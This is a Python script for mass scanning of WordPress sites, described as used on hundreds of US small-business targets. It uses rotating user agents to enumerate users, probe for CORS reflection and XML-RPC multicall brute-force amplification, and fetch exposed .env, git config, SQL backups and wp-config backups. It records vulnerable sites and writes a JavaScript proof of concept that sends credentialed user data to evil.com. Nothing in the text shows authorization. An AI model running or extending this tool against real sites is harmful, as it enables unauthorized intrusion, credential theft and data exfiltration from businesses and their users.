#!/usr/bin/env python3
"""Production batch scanner — 20 workers, ThreadPoolExecutor, v2 scoring.
   Battle-tested on 600+ US SMB targets across 28 sectors.
   Usage: python3 scanner.py targets.txt [workers]
   Format: domain|company|sector (one per line)"""

import sys, json, subprocess, os, datetime, re, concurrent.futures

OUTPUT_DIR = "/root/output/recon"
os.makedirs(OUTPUT_DIR, exist_ok=True)

UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/125.0.0.0 Safari/537.36",
]
ua_idx = 0

def ua():
    global ua_idx; u = UAS[ua_idx % len(UAS)]; ua_idx += 1; return u

def curl_raw(url, method="GET", headers=None, data=None, timeout=12):
    cmd = ["curl", "-sk", "--max-time", str(timeout)]
    if headers:
        for k, v in headers.items():
            cmd.extend(["-H", f"{k}: {v}"])
    if data:
        cmd.extend(["-d", data])
    if method != "GET":
        cmd.extend(["-X", method])
    cmd.append(url)
    try:
        r = subprocess.run(cmd, capture_output=True, timeout=timeout+5)
        return r.stdout, r.returncode
    except:
        return b"", -1

def curl_code(url, timeout=8):
    cmd = ["curl", "-sk", "-m", str(timeout), "-o", "/dev/null", "-w", "%{http_code}", url]
    try:
        r = subprocess.run(cmd, capture_output=True, timeout=timeout+5)
        return r.stdout.decode().strip()
    except:
        return "000"

def test_target(domain, sector, company=""):
    if not company: company = domain
    ts = datetime.datetime.now(datetime.UTC).strftime("%Y-%m-%dT%H:%M:%SZ")
    findings = []; score = 0
    proxy = None
    proto = None

    for p in ["https", "http"]:
        code = curl_code(f"{p}://{domain}/")
        if code not in ["000", ""]:
            proto = p; break
    if not proto:
        return {"domain": domain, "sector": sector, "alive": False, "is_wp": False, "score": 0, "severity": "DEAD"}

    # WordPress detection (v2: check both login AND json)
    login_code = curl_code(f"{proto}://{domain}/wp-login.php")
    json_code = curl_code(f"{proto}://{domain}/wp-json/")
    is_wp = login_code not in ["000", "404", ""] or json_code not in ["000", "404", ""]

    if not is_wp:
        return {"domain": domain, "sector": sector, "alive": True, "is_wp": False, "score": 0, "severity": "NOT_WP"}

    score += 1; findings.append("wordpress")

    # Users
    body, _ = curl_raw(f"{proto}://{domain}/wp-json/wp/v2/users")
    users = []
    try:
        data = json.loads(body.decode('utf-8', errors='replace'))
        if isinstance(data, list):
            for u in data:
                users.append({'id': u.get('id'), 'name': u.get('name','?'), 'slug': u.get('slug','?')})
    except: pass
    if users:
        score += 2; findings.append(f"wp_users_{len(users)}")

    # CORS (explicit -I header check)
    cors_origin = ""; cors_creds = ""
    cmd = ["curl", "-sk", "-m", "8", "-I", "-H", "Origin: https://evil.com",
           f"{proto}://{domain}/wp-json/wp/v2/users"]
    try:
        r = subprocess.run(cmd, capture_output=True, timeout=10)
        hdrs = r.stdout.decode().lower()
        for line in hdrs.split('\n'):
            if 'access-control-allow-origin:' in line:
                cors_origin = line.split(':', 1)[1].strip()
            if 'access-control-allow-credentials:' in line:
                cors_creds = line.split(':', 1)[1].strip()
    except: pass

    if "evil.com" in cors_origin.lower() and cors_creds.strip() == "true":
        score += 3; findings.append("cors_credentialed")
    elif cors_origin == "*":
        findings.append("cors_wildcard")

    # XMLRPC
    xd = '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'
    body, _ = curl_raw(f"{proto}://{domain}/xmlrpc.php", method="POST", data=xd)
    txt = body.decode('utf-8', errors='replace')
    if "system.multicall" in txt:
        score += 3; findings.append("xmlrpc_multicall")
    elif "methodName" in txt:
        findings.append("xmlrpc_active")

    # Registration
    body, _ = curl_raw(f"{proto}://{domain}/wp-login.php?action=register")
    rt = body.decode().lower()
    if "register" in rt and "user_login" in rt and "wp-submit" in rt:
        score += 2; findings.append("registration_open")

    # Source leaks (strict content verification)
    sensitive_paths = {
        "/.env": ["APP_", "DB_", "_KEY", "_SECRET", "PASSWORD"],
        "/info.php": ["PHP Version", "phpinfo", "phpcredits"],
        "/phpinfo.php": ["PHP Version", "phpinfo"],
        "/.git/config": ["[core]"],
        "/backup.sql": ["CREATE TABLE", "INSERT INTO", "DROP TABLE"],
        "/wp-config.php.bak": ["DB_NAME", "DB_PASSWORD"],
        "/wp-config.php~": ["DB_NAME", "DB_PASSWORD"],
    }
    leaks = []
    for path, keywords in sensitive_paths.items():
        body, _ = curl_raw(f"{proto}://{domain}{path}")
        body_text = body.decode('utf-8', errors='replace')
        if len(body_text) < 20: continue
        if "<html" in body_text[:100].lower() or "<script" in body_text[:100].lower(): continue
        code = curl_code(f"{proto}://{domain}{path}")
        if code == "200" and any(kw in body_text for kw in keywords):
            leaks.append(path)
            score += 4
    if leaks:
        findings.append(f"leaks_{len(leaks)}")

    # Severity (v2 thresholds)
    if score >= 8: severity = "CRITICAL"
    elif score >= 5: severity = "HIGH"
    elif score >= 3: severity = "MEDIUM"
    elif score >= 1: severity = "LOW"
    else: severity = "NONE"

    result = {
        "domain": domain, "company": company, "sector": sector,
        "severity": severity, "score": score, "findings": findings,
        "alive": True, "is_wp": True, "wp_users": len(users),
        "cors_credentialed": "cors_credentialed" in findings,
        "xmlrpc_multicall": "xmlrpc_multicall" in findings,
        "registration_open": "registration_open" in findings,
        "source_leaks": leaks, "timestamp": ts
    }

    # Write markdown report for vulnerable targets
    if score > 0:
        with open(f"{OUTPUT_DIR}/{domain}_findings.md", 'w') as f:
            f.write(f"# Findings: {domain}\n- **Company**: {company}\n- **Sector**: {sector}\n")
            f.write(f"- **Severity**: {severity} (Score: {score})\n- **Date**: {ts}\n\n")
            if is_wp:
                f.write(f"## WordPress\n- wp-login: {login_code}\n- wp-json: {json_code}\n\n")
                if users:
                    f.write(f"## Exposed Users ({len(users)})\n")
                    for u in users:
                        f.write(f"- ID={u['id']}: {u['name']} ({u['slug']})\n")
                    f.write("\n")
                if "cors_credentialed" in findings:
                    f.write("## CORS Misconfiguration\n")
                    f.write(f"- Origin: `{cors_origin}` (reflects arbitrary origin)\n")
                    f.write(f"- Credentials: `{cors_creds}`\n")
                    f.write("### PoC\n```html\n")
                    f.write(f"<script>\nfetch('{proto}://{domain}/wp-json/wp/v2/users',{{credentials:'include'}})\n")
                    f.write(f"  .then(r=>r.text()).then(d=>location='https://evil.com/?d='+btoa(d))\n</script>\n```\n\n")
                if "xmlrpc_multicall" in findings:
                    f.write("## XMLRPC system.multicall\n- Brute force amplification (1000x+)\n\n")
            if leaks:
                f.write(f"## Source Leaks ({len(leaks)})\n")
                for p in leaks: f.write(f"- `{p}`\n")

    return result

def main():
    if len(sys.argv) < 2:
        print("Usage: scanner.py <targets_file> [workers]")
        sys.exit(1)

    tf = sys.argv[1]
    workers = int(sys.argv[2]) if len(sys.argv) > 2 else 20

    targets = []
    with open(tf) as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith('#'):
                p = line.split('|')
                targets.append((p[0].strip(), p[-1].strip() if len(p) > 2 else "Unknown",
                               p[1].strip() if len(p) > 1 else p[0].strip()))

    print(f"Testing {len(targets)} targets ({workers} workers)\n{'='*70}")

    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
        fut = {ex.submit(test_target, d, s, c): d for d, s, c in targets}
        for f in concurrent.futures.as_completed(fut):
            try:
                r = f.result()
                results.append(r)
                if r.get('score', 0) > 0:
                    print(f"  [{r['severity']:>8}] {r['domain']:45s} | {r['score']:2d} | {', '.join(r['findings'])}")
            except Exception as e:
                print(f"  [ERROR] {fut[f]}: {e}")

    vuln = [r for r in results if isinstance(r, dict) and r.get('score', 0) > 0]
    print(f"\nCompleted: {len(results)} targets, {len(vuln)} vulnerable")

    if vuln:
        print("\nVulnerable targets:")
        for r in sorted(vuln, key=lambda x: -x['score']):
            print(f"  [{r['severity']:>7}] {r['domain']:45s} | {r['sector']:20s} | {r['score']}pts | {', '.join(r['findings'])}")

    # Save JSON summary
    with open(f"{OUTPUT_DIR}/batch_summary.json", 'w') as f:
        json.dump({"total": len(results), "vulnerable": len(vuln),
                   "results": [r for r in results if isinstance(r, dict) and r.get('score', 0) > 0]}, f, indent=2)

    # Append JSONL for continuous tracking
    with open(f"{OUTPUT_DIR}/vuln_summary.jsonl", 'a') as f:
        for r in vuln:
            f.write(json.dumps(r) + "\n")

if __name__ == "__main__":
    main()
